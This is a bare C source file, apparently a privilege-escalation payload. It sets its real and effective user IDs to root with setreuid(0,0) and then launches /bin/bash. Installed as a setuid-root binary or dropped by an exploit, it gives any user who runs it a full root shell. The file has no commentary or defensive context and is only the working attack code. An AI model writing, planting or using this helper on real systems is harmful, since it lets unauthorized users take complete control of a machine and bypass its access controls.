#include <unistd.h>

int main(){
    char *args[]={"/bin/bash", NULL};
    setreuid(0,0);
    execvp(args[0],args);
    return 0;
}
